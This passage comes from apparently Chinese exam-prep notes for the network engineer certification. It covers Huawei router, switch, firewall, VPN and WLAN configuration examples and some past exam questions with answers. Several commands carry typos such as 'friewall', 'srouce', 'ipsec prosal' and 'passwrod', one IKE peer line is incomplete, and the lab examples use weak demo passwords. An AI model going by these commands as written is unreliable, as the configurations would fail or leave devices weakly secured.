（5～8）</h3><blockquote><p>例如：计算机病毒、网络攻击、加密算法、密钥管理、数字签名、报文摘要、PKI数字证书、入侵检测技术、入侵防御技术、安全协议、认证技术、VPN、防火墙、WAF、漏洞扫描设备、等级保护制度</p></blockquote><h3 id="网络管理技术-（5～6）"><a href="#网络管理技术-（5～6）" class="headerlink" title="网络管理技术 （5～6）"></a>网络管理技术 （5～6）</h3><blockquote><p>例如：Windows&#x2F;Linux网管命令、Linux系统命令、Linux目录结构、Linux配置文件、SNMP协议、网络管理概念、RAID、网络存储、网络故障排除</p></blockquote><h3 id="网络规划和设计-3"><a href="#网络规划和设计-3" class="headerlink" title="网络规划和设计 3"></a>网络规划和设计 3</h3><blockquote><p>例如：需求分析、通信规范分析、逻辑网络设计、物理网络设计、安装和维护、网络运维测试工具</p></blockquote><h3 id="计算机专业英语-5"><a href="#计算机专业英语-5" class="headerlink" title="计算机专业英语 5"></a>计算机专业英语 5</h3><hr><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="网络系统分析与设计-（20-40）"><a href="#网络系统分析与设计-（20-40）" class="headerlink" title="网络系统分析与设计 （20-40）"></a>网络系统分析与设计 （20-40）</h3><blockquote><p>例如：对现有网络进行分析、网络拓扑设计、IP地址规划、网络设备选择判断、介质选择、链路聚合、堆叠和级联、网络测试、网络存储、RAID、网络管理命令、POE供电、综合布线系统、多出口链路负载策略</p></blockquote><h3 id="网络设备原理及配置-（15-20）"><a href="#网络设备原理及配置-（15-20）" class="headerlink" title="网络设备原理及配置 （15-20）"></a>网络设备原理及配置 （15-20）</h3><blockquote><p>例如：交换机基本原理和配置、STP、VLAN、静态路由、RIP、OSPF、BGP、路由引入、ACL、NAT、路由基本配置、路由器DHCP配置、三层交换机配置、IPV6、WLAN、广域网配置、策略路由、VRRP、路由策略，网络故障排除</p></blockquote><h3 id="网络服务器的原理及配置-（0-20）"><a href="#网络服务器的原理及配置-（0-20）" class="headerlink" title="网络服务器的原理及配置 （0-20）"></a>网络服务器的原理及配置 （0-20）</h3><blockquote><p>例如：Windows 2008平台&#x2F;Linux平台下的服务器基本配置、Web、FTP、DNS、DHCP服务的配置</p></blockquote><h3 id="网络安全原理及配置-（10-20）"><a href="#网络安全原理及配置-（10-20）" class="headerlink" title="网络安全原理及配置 （10-20）"></a>网络安全原理及配置 （10-20）</h3><blockquote><p>例如：认证方式及部署、虚拟专用网VPN、防火墙安全策略部署配置、病毒防治、网络攻击防治，网络安全设备的部署</p></blockquote><hr><h2 id="华为核心配置命令"><a href="#华为核心配置命令" class="headerlink" title="华为核心配置命令"></a>华为核心配置命令</h2><ul><li><ol><li>Telnet 23</li></ol></li></ul><pre><code class="hljs bash">telnet server <span class="hljs-built_in">enable</span>user-interface vty 0 4 authentication-mode aaa history-command max-size 20aaa <span class="hljs-comment"># 本地验证</span>    local-user admin-01 password cipher 123456a idle-timeout 10 0    local-user admin-01 privilege level 15    local-user admin-01 service-type telnet<span class="hljs-comment"># Client</span>sysname clientint g 0/0/0    ip add 192.168.10.10 24&gt;telnet 192.168.10.254<span class="hljs-comment"># Server</span>sysname serverint g 0/0/0    ip add 192.168.10.254telnet server <span class="hljs-built_in">enable</span>user-interface vty 0 4    protocol inbound telnet    <span class="hljs-built_in">set</span> authentication password cipher 123456    <span class="hljs-comment">## 方式2</span>    authentication password        123456a        <span class="hljs-built_in">set</span> authentication password cipher 123456a        protocol inbound telnet        idle-timeout 5        history-command max-size 20        user privilege level 0        <span class="hljs-comment">## 方式3</span>    authentication aaa        quit    aaa <span class="hljs-comment"># level:0参观级，1监控级，2配置级，3~15管理级</span>        local-user admin-01 password cipher 123456a        local-user admin-01 privilege level 0        local-user admin-01 service-type telnet        local-user admin-02 password cipher 123456a        local-user admin-02 privilege level 2        local-user admin-02 service-type telnet</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250419202148410.png" alt="Win10添加环回网络适配器"></p><p>Win10添加环回网络适配器</p><p>win + R 运行 ncpa.cpl; 修改环回口地址 192.168.10.10&#x2F;24</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250419204017631.png" alt="Cloud添加环回口地址"></p><p>Cloud添加环回口地址</p><ul><li><ol><li>ACL</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 基本ACL</span>acl 2000 rule 10 deny <span class="hljs-built_in">source</span> 192.168.1.0 0.0.0.255<span class="hljs-comment"># 高级ACL</span>acl 3000    rule 20 deny ip <span class="hljs-built_in">source</span> 192.168.1.0 0.0.0.255 destination 192.168.3.100 0.0.0.0    rule 30 deny ip <span class="hljs-built_in">source</span> any destination 192.168.3.100 0.0.0.0interface g0/0/2    traffic-filter outbound acl 3000</code></pre><ul><li><ol><li>NAT</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 静态NAT</span>nat static <span class="hljs-built_in">enable</span>nat static global 12.1.1.2 inside 192.168.1.1<span class="hljs-comment"># 动态NAT</span>nat address-group 1 12.1.1.2 12.1.1.4acl 2000    rule 10 permit <span class="hljs-built_in">source</span> 192.168.1.0 0.0.0.255interface g0/0/1    nat outbound 2000 address-group 1 no-pat<span class="hljs-comment"># NATP(不仅转换IP地址，还对端口进行转换)</span>nat outbound 2000 address-group 1<span class="hljs-comment"># Easy IP</span>acl 2000    rule 10 permit <span class="hljs-built_in">source</span> 192.168.1.0 0.0.0.255interface g0/0/1    nat outbound 2000<span class="hljs-comment"># NAT Server</span>nat server protocol tcp global 12.1.1.2 80 inside 192.168.1.10 80</code></pre><ul><li><ol><li>DHCP</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 接口地址池</span>dhcp <span class="hljs-built_in">enable</span>interface g0/0/1    dhcp <span class="hljs-keyword">select</span> interface    dhcp server dns-list 10.1.1.2    dhcp server excluded-ip-address 10.1.1.2    dhcp server lease day 3<span class="hljs-comment"># 全局地址池</span>dhcp <span class="hljs-built_in">enable</span>    ip pool 1    network 1.1.1.0 mask 24    gateway-list 1.1.1.1    dns-list 1.1.1.1    lease day 10    interface g0/0/1    dhcp <span class="hljs-keyword">select</span> global</code></pre><ul><li><ol><li>网络质量监测</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># BFD</span>bfd 1 <span class="hljs-built_in">bind</span> peer-ip 12.1.1.2 source-ip 12.1.1.1 autocommitip route-static 2.2.2.0 24 12.1.1.2 track bfd-session 1<span class="hljs-comment"># NQA</span>nqa test-instance root icmp <span class="hljs-comment"># 创建一个nqa实例，测试管理员账号为root，测试实例名称为icmp</span>    test-type icmp <span class="hljs-comment"># 测试类型为icmp协议测试</span>    frequency 10 <span class="hljs-comment"># 指定连续两次探测时间间隔为10S</span>    probe-count 2 <span class="hljs-comment"># 指定一次探测进行的测试次数</span>    destination-address ipv4 12.1.1.2 <span class="hljs-comment"># 测试的对端IP地址</span>    start nowip route-static 0.0.0.0 0.0.0.0 12.1.1.2 track nqa root icmp <span class="hljs-comment"># 在默认路由上连接nqa</span></code></pre><ul><li><ol><li>网关冗余VRRP</li></ol></li></ul><pre><code class="hljs bash">interface vlanif 10    vrrp vrid 10 virtual-ip 192.168.10.254 <span class="hljs-comment"># 配置vrrp虚拟路由器10，虚拟IP地址为192.168.10.254</span>    vrrp vrid 10 priority 120 <span class="hljs-comment"># 虚拟路由器10的优先级设置为120（默认是100）</span>    vrrp vrid 10 preempt-mode timer delay 20 <span class="hljs-comment"># 抢占延时设置为20秒</span>display vrrp brief <span class="hljs-comment"># 查看VRRP状态</span><span class="hljs-comment"># VRRP跟踪上行接口：</span>vrrp vrid 10 track interface g 0/0/1 reduced 30 <span class="hljs-comment"># 跟踪上行接口，接口down掉自动减少30优先级</span></code></pre><ul><li><ol><li>RIP OSPF BGP</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 配置RIPv2</span>rip 1 version 2 network 12.0.0.0 <span class="hljs-comment"># 宣告网段，RIP只能宣告主类网络号</span><span class="hljs-comment"># 配置OSPF</span>ospf 1    area 0        network 12.1.1.0 0.0.0.3 <span class="hljs-comment"># 宣告网段 12.1.1.0/30</span>        network 100.1.1.0 0.0.0.255 <span class="hljs-comment"># 宣告网段 100.1.1.0/24</span><span class="hljs-comment"># 配置eBGP和iBGP对等体，建立BGP邻居</span>bgp 100 <span class="hljs-comment"># 启动BGP，指定本地AS号为100</span>    peer 34.1.1.2 as-number 200 <span class="hljs-comment"># 配置R3和R4建立eBGP连接（或指定对等体的IP地址及其所属的AS编号）</span>    ipv4-family unicast <span class="hljs-comment"># 配置ipv4单播路由</span>        network 200.1.1.0 24 <span class="hljs-comment"># 把网络宣告进入BGP （BGP宣告需要加掩码，OSPF宣告需要加通配符，RIP宣告不需要加）</span><span class="hljs-comment"># 路由引入与网络优化</span>rip 1    version 2    import-route bgp <span class="hljs-comment"># 将BGP路由引入到RIP</span>bgp 100    ipv4-family unicast        import-route rip 1 <span class="hljs-comment"># 将RIP路由引入到BGP</span>        peer 45.1.1.2 next-hop-local <span class="hljs-comment"># BGP对外通告的时候把下一跳设置为自己</span></code></pre><ul><li><ol><li>路由策略</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 匹配工具包括ACL或ip-prefix</span>acl 2000 <span class="hljs-comment"># 定义标准 ACL 2000</span>    rule 10 deny <span class="hljs-built_in">source</span> 10.1.1.0 0.0.0.255 <span class="hljs-comment"># 拒绝网络 10.1.1.0/24</span>    rule 20 permit <span class="hljs-comment"># 其他流量都允许</span>ip-prefix xx index 10 permit 10.1.2.0 24 <span class="hljs-comment"># 前缀列表名字为XX,配置10.1.2.0/24</span><span class="hljs-comment"># 定义路由策略，并引用匹配工具</span>route-policy xx permit node 10 <span class="hljs-comment"># 定义路由策略，名为xx</span>    if-match acl 2000 <span class="hljs-comment"># 引用前面配置的ACL</span>route-policy xx permit node 10    if-match ip-prefix xx <span class="hljs-comment"># 引用前面配置的ip-prefix</span><span class="hljs-comment"># 应用路由策略，两个工具：route-policy 和 filter-policy，在路由引入时，调用路由策略</span>import-route ip rip route-policy xx <span class="hljs-built_in">export</span> static <span class="hljs-comment"># 设置对引入的静态路由，在向外发布时进行过滤</span></code></pre><ul><li><ol><li>策略路由</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 配置ACL，匹配流量</span>acl 2025    rule 10 permit <span class="hljs-built_in">source</span> 192.168.10.0 0.0.0.255acl 2026    rule 10 permit <span class="hljs-built_in">source</span> 192.168.20.0 0.0.0.255<span class="hljs-comment"># 配置流分类，关联ACL</span>traffic classifier test2025 <span class="hljs-comment"># 配置流分类，名称为test2025</span>    if-match acl 2025traffic classifier test2026    if-match acl 2026<span class="hljs-comment"># 配置流行为</span>traffic behavior re-dianxin <span class="hljs-comment"># 配置流行为 re-dianxin</span>    traffic ip-nexthop 12.1.1.2 <span class="hljs-comment"># 下一跳设置为12.1.1.2</span>traffic behavior re-liantong    traffic ip-nexthop 13.1.1.2<span class="hljs-comment"># 配置流策略P和Q</span>traffic policy P    classifier test2025 behavior re-dianxin <span class="hljs-comment"># 把test2025的流量扔给电信出口</span>traffic policy Q    classifier test2026 behavior re-liantong <span class="hljs-comment"># 把test2026的流量扔给连通</span><span class="hljs-comment"># 在接口应用流策略</span>interface g0/0/0    traffic-policy P inbound <span class="hljs-comment"># 在流量入方向应用策略P</span>interface g0/0/1    traffic-policy Q outbound <span class="hljs-comment"># 在流量出放心应用策略Q</span></code></pre><ul><li><ol><li>IPSEC VPN</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment">## (1) 手动静态方式建立IPSEC隧道（manual）</span><span class="hljs-comment"># 匹配感兴趣的流量</span>acl 3000    rule 10 permit ip srouce 192.168.10.0 0.0.0.255 destination 192.168.20.0 0.0.0.255<span class="hljs-comment"># 配置IPSEC提议</span>ipsec proposal <span class="hljs-built_in">cd</span> <span class="hljs-comment"># IPSEC提议名称cd</span>    esp authentication-algorithm sha2-256 <span class="hljs-comment"># 认证算法采用sha2-256</span>    esp encryption-algorithm aes-128 <span class="hljs-comment"># 加密算法采用aes-128</span><span class="hljs-comment"># 配置IPSEC手动方式安全策略</span>ipsec policy chengdu 10 manual <span class="hljs-comment"># 配置IPSEC策略chengdu，方式为手动</span>    security acl 3000 <span class="hljs-comment"># 保护acl 3000的流量</span>    proposal <span class="hljs-built_in">cd</span> <span class="hljs-comment"># 采用ipsec 提议cd</span>    tunnel <span class="hljs-built_in">local</span> 100.1.1.1 <span class="hljs-comment"># 配置隧道本地地址100.1.1.1</span>    tunnel remote 200.1.1.1 <span class="hljs-comment"># 配置隧道远程地址200.1.1.1</span>    sa spi inbound esp 54321 <span class="hljs-comment"># 配置入方向SA的编号54321</span>    sa string-key inbound esp cipher huawei <span class="hljs-comment"># 配置入方向SA的认证密钥为huawei</span>    sa spi outbound esp 12345 <span class="hljs-comment"># 配置出方向AS编号12345</span>    sa string-key outbound esp cipher huawei <span class="hljs-comment"># 配置出方向SA的认证密钥为huawei</span><span class="hljs-comment"># 在接口上应用IPSEC策略</span>interface g0/0/1    ipsec policy chengdu <span class="hljs-comment"># 接口上应用IPSEC策略（只能用于出接口）</span><span class="hljs-comment"># NAT地址和VPN隧道加密的流量重合，需要在NAT地址池中排除需要进行VPN传统的流量。</span><span class="hljs-comment">## (2)通过IKE动态建立 IPSEC VPN 隧道（isakmp）</span><span class="hljs-comment"># 配置IKE提议</span>ike proposal 10 <span class="hljs-comment"># ike 提议编号10</span>    authentication-algorithm sha1 <span class="hljs-comment"># 配置认证算法sha1</span>    encryption-algorithm aes-cbc-128 <span class="hljs-comment"># 配置加密算法 aes-cbc-128 （算法为AES，密钥是128位）</span>    dh group14 <span class="hljs-comment"># 密钥交换协议采用DH，采用ike v1 协商对等体</span><span class="hljs-comment"># 配置ike对等体</span>ike peer bj v1 <span class="hljs-comment"># ike 对等体为bj，采用ike v1协商对等体</span>    pre-shared-key cipher zhouzhou <span class="hljs-comment"># 配置预共享密钥 zhouzhou </span>    ike-proposal 10 <span class="hljs-comment"># ike提议编号10</span>    local-address 100.1.1.1 <span class="hljs-comment"># 本地地址 100.1.1.1.</span>    remote-address <span class="hljs-comment"># 配置IPSEC提议</span>ipsec prosal <span class="hljs-built_in">cd</span> <span class="hljs-comment"># ipsec 提议名称cd</span>    esp authentication-algorithm sha2-256 <span class="hljs-comment"># 认证算法采用sha2-256</span>    esp encryption-algorithm aes-128 <span class="hljs-comment"># 加密算法采用aes-128</span><span class="hljs-comment"># 配置ipsec策略</span>ipsec policy chengdu 10 isakmp <span class="hljs-comment"># 配置ipsec策略chengdu, 编号10, isakmp表示自动隧道</span>    security acl 3000 <span class="hljs-comment"># 保护ACL 3000 匹配的流量</span>    ike-peer bj <span class="hljs-comment"># ike对等体是bj</span>    proposal <span class="hljs-built_in">cd</span> <span class="hljs-comment"># 采用ipsec提议cd</span><span class="hljs-comment"># 接口应用安全策略</span>interface g0/0/1    ipsec policy chengdu</code></pre><ul><li><ol><li>无线WLAN</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment">## 隧道转发：用户的数据报文到达AP后，需要经过CAPWAP数据隧道封装之后发给AC，再由AC转发到上层网络。</span><span class="hljs-comment">## 直接转发：用户的数据报文到达AP后，不经过CAPWAP数据隧道封装而直接转发到上层网络。</span><span class="hljs-comment"># (1) 在AC上配置AP上线</span><span class="hljs-comment"># 创建域管理模版，并配置国家代码</span>wlan    regulatory-domain-profile name zhouzhou <span class="hljs-comment"># 配置域管理模版，名称是zhouzhou</span>    country-code cn <span class="hljs-comment"># 配置国家代码，cn代表中国</span><span class="hljs-comment"># 创建AP组，并引用特定的域管理模版</span>wlan    ap-group name jiaoxue <span class="hljs-comment"># 配置AP组，名称是jiaoxue</span>    regulatory-domain-profile zhouzhou <span class="hljs-comment"># 引用域管理模版 zhouzhou</span><span class="hljs-comment"># 配置CAPWAP隧道接口或源地址</span>capwap <span class="hljs-built_in">source</span> interface vlanif 100 <span class="hljs-comment"># capwap 隧道源地址是vlanif100地址</span><span class="hljs-comment"># 配置AP设备入网认证</span>wlan    ap auth-mode mac-auth <span class="hljs-comment"># 配置AP通过MAC地址认证</span>    ap-id 1 ap-mac 00e0-fc3f-7500    ap-name JX001    ap-group jiaoxue<span class="hljs-comment"># (2) 配置AC无线业务</span><span class="hljs-comment"># 配置用户认证方式</span>wlan    security-profile name sec_work <span class="hljs-comment"># 配置安全模版，名称为sec_work</span>    security wpa-wpa2 psk pass-phrase a1234567 aes <span class="hljs-comment"># 采用WPA-WPA2方式认证，PSK表示预共享密钥，简单理解就是通过密码方式认证，密码是a1234567，加密算法采用AES</span><span class="hljs-comment"># 配置SSID模版</span>wlan    ssid-profile name profile_work <span class="hljs-comment"># ssid模版，名改是profile_work</span>    ssid work <span class="hljs-comment"># SSID名称是work</span><span class="hljs-comment"># 配置VAP模版，设置为隧道模式，配置用户VLAN101，并绑定安全模版、SSID模版</span>wlan    vap-profile name vap_work <span class="hljs-comment"># VAP模版名称是vap_work</span>    forward_mode tunnel <span class="hljs-comment"># 转发模式是隧道模式</span>    service-vlan vlan-id 101 <span class="hljs-comment"># 使用work这个VAP模版的用户服务VLAN是101</span>    security-profile sec_work <span class="hljs-comment"># 调用安全模版sec_work</span>    ssid-profile profile_work <span class="hljs-comment"># 调用SSID模版profile_work</span><span class="hljs-comment"># 在AP组中绑定vap模版</span>ap-group name jiaoxue    vap_profile vap_work wlan 1 radio all <span class="hljs-comment"># 在AP组中，将指定的VAP模版引用到射频</span><span class="hljs-comment"># 直接转发模式：forward-mode direct-forward</span></code></pre><ul><li><ol><li>防火墙配置</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 防火墙接口加入响应安全域</span>firewall zone trust    add interface g0/0/1friewall zone dmz    add interface g0/0/2firewall zone untrust    add interface g0/0/3<span class="hljs-comment"># 配置安装策略，让trust区域可以访问呢internet</span>security-policy <span class="hljs-comment"># 进入安全策略配置</span>    rule name trust_to_untrust        source-zone trust        source-address 192.168.1.0 mask 255.255.255.0        destination-zone untrust        action permit<span class="hljs-comment"># NAT配置</span>nat address-group addressgroup1    mode pat    sectiion 0 100.1.1.10 100.1.1.20 <span class="hljs-comment"># 地址池编号是0，包含可用公网IP地址从100.1.1.10到100.1.1.20</span>nat-policy    rule name policy-nat1        source-zone trust        destination-zone untrust        source-address 192.168.1.0 24        destination-address any        action source-nat address-group addressgroup1 <span class="hljs-comment"># 采用源地址NAT，把192.168.1.0/24网段转换为addressgroup1的公网地址</span><span class="hljs-comment"># 防火墙方向trust到dmz区域的流量</span>security-policy    rule name trust_to_dmz        source-zone trust        destination-zone dmz        action permit<span class="hljs-comment"># 配置服务器端口映射</span>security-policy    rule name untrust_to_dmz    source-zone untrust    destination-zone dmz    destination-address 192.168.2.0 24    action permit    nat server policy_web protocol tcp global 100.1.1.100 80 inside 192.168.2.100 80</code></pre><ul><li><ol><li>MSTP配置</li></ol></li></ul><pre><code class="hljs bash"> <span class="hljs-comment"># MSTP(Multiple Spanning tree Algorithm and protocol)是多生成树技术，允许在一个交换环境中运行多个生成树，每个生成树称为一个实例（instance）.实例时间的生成树彼此独立，如一个实例下的阻塞接口在另外一个实例上可能是一个转发端口。</span> <span class="hljs-comment"># MSTP将环路网络修剪成一个无环的树形网络，避免广播风暴的产生，同时还提供了数据转发的多个冗余路径，在数据转发过程中实现VLAN数据的负载均衡。</span> <span class="hljs-comment"># MSTP把一个交换网络划分成多个域（Multiple spanning tree instance，MSTI），每个域称为一个MST域。</span> <span class="hljs-comment"># MSTP通过设置vlan映射表（就是vlan和MSTI的对应关系表），把VLAN和MSTP联系起来。每个vlan只能对应一个MSTI，即同一个vlan的数据只能在一个MSTI中传输，而一个MSTI可以对应多个vlan。</span> <span class="hljs-comment"># S1配置如下</span>```bash[S1] stp mode mstp[S1] stp region-configuration <span class="hljs-comment"># 进入MSTP配置模式</span>[S1-mst-region] region-name lv <span class="hljs-comment"># 配置域名为lv</span>[S1-mst-region] revision-level 1 <span class="hljs-comment"># 配置版本等级为1</span>[S1-mst-region] instance 1 vlan 10 <span class="hljs-comment"># 将vlan10加入实例1中</span>[S1-mst-region] instance 2 vlan 20 <span class="hljs-comment"># 将vlan20加入实例2中</span>[S1-mst-region] active region-configuration <span class="hljs-comment"># 激活配置</span>[S1-mst-region] quit <span class="hljs-comment"># 退出配置模式</span>[S1] stp instance 1 root primary <span class="hljs-comment"># 配置此交换机为实例1的主根</span>[S1] stp instance 2 root secondary <span class="hljs-comment"># 配置此交换机为实例2的备根</span><span class="hljs-comment"># S1配置如下</span>[S2] stp mode mstp <span class="hljs-comment"># 将交换机配置成MSTP模式</span>[S2] stp region-configuration <span class="hljs-comment"># 进入MSTP配置模式</span>[S2-mst-region] region-name lv <span class="hljs-comment"># 配置域名为lv</span>[S2-mst-region] instance 1 vlan 10 <span class="hljs-comment"># 将vlan10加入实例1中</span>[S2-mst-region] instance 2 vlan 20 <span class="hljs-comment"># 将vlan20加入实例2中</span>[S2-mst-region] active region-configuration <span class="hljs-comment"># 激活配置（必须配置）</span>[S2-mst-region] quit <span class="hljs-comment"># 退出配置模式</span>[S2] stp instance 1 root secondary <span class="hljs-comment"># 配置此交换机为实例1的备根</span>[S2] stp instance 2 root primary <span class="hljs-comment"># 配置此交换机为实例2的主根</span></code></pre><ul><li><ol><li>smart link</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># Smart Link 组也称为灵活链路组，一个组内最多可包含两个接口，其中一个为主接口（Master Port），另一个为从接口（Slave Port）。正常情况下，只有一个接口处于转发（Active）状态，另一个接口被阻塞，处于待命（inactive）状态。</span><span class="hljs-comment"># Smart Link 实现了主备链路的冗余备份，具有快速收敛功能，收敛速度可达亚秒级；（类似于STP，不过能将网络切换并收敛的速度提高，缩短更多时间。）</span>interface g0/0/1    stp <span class="hljs-built_in">disable</span> <span class="hljs-comment"># 接口禁用stp功能</span>smart-link group 1    port g0/0/1 master    port g0/0/2 slaverestore <span class="hljs-built_in">enable</span> <span class="hljs-comment"># 使能回切功能</span>timer wtr 30 <span class="hljs-comment"># 设置回切时间30秒</span></code></pre><ul><li><ol><li>链路聚合Eth-Trunk</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment">## 手工模式配置</span><span class="hljs-comment"># 当需要在两个直连设备之间提供一个较大的链路带宽，而其中一端或两端设备都不支持LACP协议时，可以配置手工模式链路聚合。手工模式下，Eth-Trunk的建立、成员接口的加入完全由手工来配置，所有活动链路都参与数据的转发，平均分担流量。</span>[SW1] interface eth-trunk 1 <span class="hljs-comment"># 创建Eth-Trunk接口，并进入Eth-Trunk接口视图</span>[SW1-Eth-Trunk1] mode manual load-balance <span class="hljs-comment"># 配置Eth-Trunk的工作模式。缺省情况下为手工模式。</span>[SW1-Eth-Trunk1] trunkport GigabitEthernet 0/0/1 to 0/0/2 <span class="hljs-comment"># 批量增加成员接口</span>[SW1-Eth-Trunk1] port link-type trunk[SW1-Eth-Trunk1] port trunk allow-pass vlan 10 20<span class="hljs-comment"># LACP模式配置：LACP模式下，需手工创建Eth-Trunk，手工加入Eth-Trunk成员接口，但活动接口的选择是由LACP协商确定的，配置相对灵活。</span>[SW1] interface eht-trunk 1[SW1-Eth-Trunk1] mode lacp[SW1-Eth-Trunk1] max active-linknumber 2 <span class="hljs-comment"># 最大活跃端口为2</span>[SW1-Eth-Trunk1] trunkport GigabitEthernet 0/0/1 to 0/0/3 <span class="hljs-comment"># 批量增加成员接口</span>[SW1-Eth-Trunk1] port link-type trunk[SW1-Eth-Trunk1] port trunk allow-pass vlan 10 20[SW1-Eth-Trunk1] quit[SW1] lacp priority 30000 <span class="hljs-comment"># 配置lacp优先级，默认32768，越小越优先</span></code></pre><ul><li><ol><li>DHCP Snooping网关防假冒配置</li></ol></li></ul><pre><code class="hljs bash">dhcp snooping <span class="hljs-built_in">enable</span> <span class="hljs-comment"># 开机交换机的DHCP Snoooping功能</span>interface GigabitEthernet 0/0/3    dhcp snooping <span class="hljs-built_in">enable</span> <span class="hljs-comment"># 接口开启DHCP Snooping功能</span>interface GigabitEthernet 0/0/4    dhcp snooping <span class="hljs-built_in">enable</span> <span class="hljs-comment"># 接口开启DHCP Snooping功能</span>interface GigabitEthernet 0/0/1    dhcp snooping trusted <span class="hljs-comment"># 配置交换机连接合法DHCP服务器的接口为信任接口，其他的接口默认为非信任接口</span></code></pre><hr><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><ol><li>FTP</li></ol></li></ul><blockquote><p>备份网络设备上的配置文件 网络设备的操作系统文件 许可文件<br>外包公司：要求每个月都要备份网络主要设备的配置文件</p></blockquote><pre><code class="hljs bash">&gt; disvrpcfg.zip  <span class="hljs-comment"># 网络配置文件</span>sd1: 主控板上的SD卡存储根目录flash: 主控板上的falsh存储器根目录slave#sd1: 备用主控板上的SD卡存储根目录slave#flash: 备用主控板上的falsh存储器根目录<span class="hljs-comment"># 当前运行配置文件（最近的上一次保存的运行配置文件+后加的未保存配置命令）</span><span class="hljs-comment"># 保存的配置文件</span>&gt; display factory-configuration <span class="hljs-comment"># 查看出厂的配置文件</span>&gt; display startup <span class="hljs-comment"># 查看设备本次已经下次启动的配置文件</span>&gt; display curent-configuration <span class="hljs-comment"># 查看当前配置</span>&gt; display saved-configuration <span class="hljs-comment"># 查看保存的配置文件</span><span class="hljs-comment"># 修改当前设备的下次启动的配置文件为vrpcfg20250419.zip</span>startup saved-configuration flash:/vrpcfg20250419.zip<span class="hljs-comment"># 通过FTP管理设备的配置文件</span>ftp server <span class="hljs-built_in">enable</span>aaa    local-user admin-02 password cipher 123456a    local-user admin-02 privilege level 15    local-user admin-02 service-type ftp    local-user admin-02 ftp-directory flash:</code></pre><ul><li><ol><li>Console</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 设备默认出厂都有一个管理地址Managemnent/MGMT（华为Web界面的出厂的默认IP管理地址是192.168.1.1/24）</span><span class="hljs-comment"># 配置一台全新的设备（路由器、交换机和防火墙（admin/Admin@123s）等）（ENSP使用CTL线可以模拟）</span>本地配置方式：console httpcli命令行：GUI和WEB配置方式<span class="hljs-comment"># 设备设置console口方式1</span>user-interface console 0    speed 9600 <span class="hljs-comment"># 配置传输速率</span>    authentication-mode password    <span class="hljs-built_in">set</span> authentication password cipher 123456a<span class="hljs-comment"># 设备设置console口方式1</span>user-interface console 0    speed 9600 <span class="hljs-comment"># 配置传输速率</span>    authentication-mode aaaaaa    local-user admin-03 password cipher 123456a    local-user admin-03 privilege level 15    local-user admin-03 service-type terminal<span class="hljs-comment"># 防火墙开启WEB服务</span>int g 0/0/0    ip add 172.16.10.254 24    service-manage ping permit    service-manage http permit    service-manage https permit</code></pre><ul><li><ol><li>SSH</li></ol></li></ul><pre><code class="hljs bash"><span class="hljs-comment">## 当所有配置配置完成后，投入使用后：关闭WEB管理功能，给Console加密，远程管理不适用telnet使用SSH</span><span class="hljs-comment"># ssh加密的远程管理，使用的是22端口号</span><span class="hljs-comment"># 认证方式：密码认证(password)【中小型网络】；RSA(基于客户端私钥的认证方式，非对称加密)【安全性要求比较高】；ECC【】;Passwrod-RSA；Password-ECC；</span>ssh server <span class="hljs-built_in">enable</span>stelnet server <span class="hljs-built_in">enable</span>aaa    local-user admin-04 passwrod cipher 123456a    local-user admin-04 privilege level 15    local-user admin-04 service-type sshuser-interface vty 0 4    authentication-mode aaa    protocol inbound ssh<span class="hljs-comment"># 设置ACL只允许某些IP登陆</span>acl 2000    rule permit <span class="hljs-built_in">source</span> 172.16.10.10  0    rule permit <span class="hljs-built_in">source</span> 172.16.10.11 0    rule deny <span class="hljs-built_in">source</span> anyuser-interface vty 0 4    acl 2000 inbound</code></pre><hr><h1 id="上午历年真题"><a href="#上午历年真题" class="headerlink" title="上午历年真题"></a>上午历年真题</h1><h2 id="2024年11月"><a href="#2024年11月" class="headerlink" title="2024年11月"></a>2024年11月</h2><ul><li><ol><li>由OSI&#x2F;RM <code>表示层</code>定义的数据压缩、加密等功能在实践中是由TCP&#x2F;IP模型的（）层实现。</li></ol><p>A.物理层<br>B.应用层<br>C.传输层<br>D.网络层</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506204655201.png" alt="img"></p><blockquote><p>B. 应用层</p></blockquote><ul><li><ol><li>在（）局域网拓扑中，每个节点都直接连接到其相邻的两个节点，形成一个物理或逻辑的环。</li></ol><p>A.以太网<br>B.令牌总线<br>C.标签交换<br>D.WiFi</p></li></ul><blockquote><p>答: B</p></blockquote><blockquote><p>A: 是总线，所以节点连接到总线上；B: 物理环是令牌环网，逻辑环是令牌总线；C: MPLS</p></blockquote><ul><li><ol><li>在海明码中，如果信息位长度为7，那么为了纠正单个错误，至少需要添加（）位校验位。</li></ol><p>A.7<br>B.14<br>C.4<br>D.3</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506205701748.png" alt="img"></p><blockquote><p>答：C</p></blockquote><blockquote><p>解析：题目说明m&#x3D;7, 要想等式成立，k&#x3D;4</p></blockquote><ul><li><ol><li>在统计时分多路复用（STDM）中，如果某个用户的帧到达率远高于其他用户，为了防止该用户独占信道，通常会( 